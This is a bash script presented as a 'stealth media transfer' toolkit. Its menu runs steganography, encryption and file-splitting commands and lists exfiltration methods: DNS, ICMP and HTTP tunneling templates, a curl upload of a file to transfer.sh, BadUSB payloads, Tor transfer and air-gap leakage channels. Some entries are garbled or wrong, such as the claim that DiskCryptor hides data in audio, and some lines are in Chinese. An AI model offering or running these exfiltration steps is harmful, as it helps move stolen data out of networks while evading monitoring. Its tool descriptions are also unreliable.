#!/bin/bash
# stealth-transfer.sh - Stealth media transfer methods
# Usage: ./stealth-transfer.sh [encode|decode|hide|exfil|tor]

MODE=${1:-menu}

STEG_DIR="$HOME/stealth-transfer"
mkdir -p "$STEG_DIR"

case $MODE in
    encode)
        echo "=== Steganography Encode ==="
        echo "1) Hide text in image (LSB)"
        echo "2) Hide file in image"
        echo "3) Hide in PDF"
        read -p "Choice: " choice
        
        case $choice in
            1)
                echo "Image file: "
                read IMG
                echo "Secret message: "
                read MSG
                echo "$MSG" | steghide embed -cf "$IMG" -ef - -o "$STEG_DIR/encoded.png" 2>/dev/null || echo "steghide not installed"
                ;;
            2)
                echo "Image: "
                read IMG
                echo "File to hide: "
                read FILE
                cat "$FILE" | steghide embed -cf "$IMG" -o "$STEG_DIR/stegged.png" 2>/dev/null
                ;;
            3)
                echo "Use: pdf-stego or wbStego"
                ;;
        esac
        ;;
    decode)
        echo "=== Steganography Decode ==="
        echo "1) Extract from image"
        echo "2) Detect hidden data"
        echo "3) Binwalk analysis"
        read -p "Choice: " choice
        
        case $choice in
            1)
                echo "Image file: "
                read IMG
                steghide extract -sf "$IMG" -xf "$STEG_DIR/extracted.txt" 2>/dev/null || echo "No hidden data found"
                ;;
            2)
                echo "Image: "
                read IMG
                zsteg "$IMG" 2>/dev/null || binwalk "$IMG" 2>/dev/null
                ;;
            3)
                echo "File: "
                read FILE
                binwalk "$FILE" 2>/dev/null
                ;;
        esac
        ;;
    hide)
        echo "=== Covert File Hiding ==="
        echo "1) Split file (segments)"
        echo "2) XOR encrypt"
        echo "3) Base64 encode"
        echo "4) Create decoy"
        read -p "Choice: " choice
        
        case $choice in
            1)
                echo "File to split: "
                read FILE
                split -b 1M "$FILE" "$STEG_DIR/part_"
                echo "Created in $STEG_DIR/"
                ;;
            2)
                echo "File: "
                read FILE
                echo "Key: "
                read KEY
                openssl enc -aes-256-cbc -salt -in "$FILE" -out "$STEG_DIR/encrypted.bin" -k "$KEY"
                ;;
            3)
                echo "File: "
                read FILE
                base64 "$FILE" > "$STEG_DIR/encoded.b64"
                ;;
            4)
                echo "Create decoy file"
                echo "Decoy content" > "$STEG_DIR/decoy.txt"
                echo "Real data appended" >> "$STEG_DIR/decoy.txt"
                ;;
        esac
        ;;
    exfil)
        echo "=== Data Exfiltration ==="
        echo "1) DNS tunneling (dnscat2)"
        echo "2) ICMP tunneling (ptunnel)"
        echo "3) HTTP tunneling (httptunnel)"
        echo "4) Cloud paste (tmpninja)"
        echo "5) TLS exfil"
        read -p "Choice: " choice
        
        case $choice in
            1)
                echo "Requires: dnscat2 server"
                echo "Client: dnscat2 --secret <key> <domain>"
                ;;
            2)
                echo "ptunnel -p <proxy> -lp <port> -d <dest> -dp <destport>"
                ;;
            3)
                echo "hts --server --port 8080"
                echo "htc --proxy <proxy> --port 8080 <server> -p <local>"
                ;;
            4)
                echo "Upload via curl:"
                echo "curl -F 'file=@data.txt' https://transfer.sh/"
                ;;
            5)
                echo "use: sslh, tcp-over-https"
                ;;
        esac
        ;;
    tor)
        echo "=== Tor-Based Transfer ==="
        echo "1) Start Tor hidden service"
        echo "2) Connect via Tor"
        echo "3) Onion share"
        echo "4) I2P"
        read -p "Choice: " choice
        
        case $choice in
            1)
                echo "Configuring Tor hidden service..."
                cat /etc/tor/torrc | grep HiddenService
                ;;
            2)
                which proxychains && echo "proxychains curl -- Onion address"
                ;;
            3)
                echo "pip install onionshare-cli"
                ;;
            4)
                echo "i2p bundle installation required"
                ;;
        esac
        ;;
    usb)
        echo "=== USB Covert Transfer ==="
        echo "1) USB rubber ducky payload"
        echo "2) Bad USB attack"
        echo "3) U盘分区加密"
        read -p "Choice: " choice
        
        case $choice in
            1)
                echo "Duckyscript converter available"
                ;;
            2)
                echo "ATtiny85 Digispark payloads"
                ;;
            3)
                echo "Use LUKS or VeraCrypt"
                ;;
        esac
        ;;
    airgap)
        echo "=== Air-Gapped Transfer ==="
        echo "1) Keyboard LED (Loki)"
        echo "2) Hard drive audio (DiskCryptor)"
        echo "3) WiFi beep (PCIL leakage)"
        echo "4) QR code exfil"
        echo "5)GSM modem transfer"
        read -p "Choice: " choice
        
        case $choice in
            1)
                echo "extruder / inkblot - LED exfil"
                ;;
            2)
                echo "DiskCryptor can hide in audio"
                ;;
            3)
                echo "WiFi card emits RF"
                ;;
            4)
                echo "qrcode -o out.png 'data'"
                ;;
            5)
                echo "插入GSM dongle发送数据"
                ;;
        esac
        ;;
    menu|*)
        echo "=== Stealth Media Transfer ==="
        echo "1) Encode (hide data)"
        echo "2) Decode (extract data)"
        echo "3) File hiding"
        echo "4) Data exfiltration"
        echo "5) Tor network"
        echo "6) USB covert"
        echo "7) Air-gapped transfer"
        read -p "Choice: " choice
        case $choice in
            1) $0 encode ;;
            2) $0 decode ;;
            3) $0 hide ;;
            4) $0 exfil ;;
            5) $0 tor ;;
            6) $0 usb ;;
            7) $0 airgap ;;
        esac
        ;;
esac